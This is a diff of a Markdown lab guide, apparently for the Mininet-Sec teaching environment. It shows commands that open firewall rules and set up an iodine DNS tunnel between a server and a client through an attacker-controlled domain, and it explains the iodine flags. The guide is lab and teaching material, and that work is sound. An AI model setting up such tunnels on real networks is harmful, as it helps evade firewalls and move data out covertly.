@@ -18,17 +18,23 @@ mnsecx fw0 iptables -A FORWARD -d 10.0.0.2 -p udp --dport 53 -j ACCEPT
 mnsecx srv2 iodined -f -c -P ChangeMe-123 10.199.199.1/24 iodine.hackinsdn.ufba.br 
 ```
 
-The fist command adds a rule to the firewall allowing incoming UDP traffic on port 53 directed to the IP address 10.0.0.2 to pass through the firewall. 
+The fist command adds a rule to the Mininet-Sec firewall allowing incoming UDP traffic on port 53 directed to the IP address 10.0.0.2 to pass through the firewall. 
 
--c to disable check of client IP/port on each request
+The second command promotes the establishement of a DNS tunnel server in *srv2*, which is a server of the Mininet-sec topology. There are 3 iodine parameters being used:
 
--f to keep running in foreground
+1. -c to disable check of client IP/port on each request;
+2. -f to keep running in foreground;
+3. -P to define a password used for authentication.
 
-## Connecting the client
+When establishing a DNS tunnel, it is necessary to define a network whose addresses will be used to create new interfaces in the server and in the clients hosts, and these interfaces will be used to promote the communication in the DNS tunnel. Another parameter that is applied is a domain, whose IP address is some that the attacker has access over.
+
+### Connecting the client
 
 ```
 iptables -I FORWARD -i s1+ -j ACCEPT
 iptables -I FORWARD -i s2+ -j ACCEPT
 mnsecx o1 iodine -f -P ChangeMe-123 10.0.0.2 iodine.hackinsdn.ufba.br
 ```
+
+
 
